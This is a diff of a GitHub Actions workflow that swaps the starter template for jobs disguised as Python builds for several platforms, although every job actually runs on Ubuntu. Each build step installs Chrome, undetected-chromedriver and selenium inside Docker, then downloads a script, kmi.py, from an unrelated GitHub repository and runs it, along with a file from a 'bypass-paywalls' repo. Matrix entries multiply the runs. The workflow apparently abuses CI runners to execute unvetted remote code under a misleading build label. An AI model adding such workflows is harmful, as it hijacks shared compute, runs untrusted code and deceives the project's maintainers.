@@ -1,36 +1,134 @@
 # This is a basic workflow to help you get started with Actions
 
-name: CI
+# This is a basic workflow to help you get started with Actions
 
-# Controls when the workflow will run
+# ------------------------------------ #
+#       Made By An V.1.0.0           #
+# ------------------------------------ #
+name: My Python Application
+# ------------------------------------ #
 on:
-  # Triggers the workflow on push or pull request events but only for the main branch
   push:
     branches: [ main ]
   pull_request:
     branches: [ main ]
-
-  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+# ------------------------------------ #
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
+  pret:
+    runs-on: ubuntu-20.04
+    strategy:
+      matrix:
+        testi: [1.1, 27, 278, 2v, 9e, 93h, os, yys,]
+        flaga: [Aqw, his, ]
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runneyr_go
+      run: |
+        sudo apt update -y && sleep 5
+        
+  Build-linux:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.9]
+        check:[tes, kot, mat]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo maov .
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
+  Build-mac:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.8]
+        check:[tesa, kotw, madt]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo mao ..
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"
+      
+  Build-parot:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.7]
+        check:[tes, koct, mzat]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"     
+      
+  Build-win:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.8]
+        check:[t1ges, kvot, mavst]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo mazxu ..
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+  Build-macos:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.7]
+        check:[texs, kosgt, mdpat]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo kola ...
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"
+      
+  Build-parotos:
+    needs: [pret]
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.9]
+        check:[teshs, kotms, mshat]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: EBroo mode ...
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/100.0.4896.60/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip install selenium && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/build/lo.txt -O ai2.html && wget https://github.com/Tamisv2/bavmw29/raw/main/kmi.py && python3 kmi.py && sleep 48"     
+
+# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
+
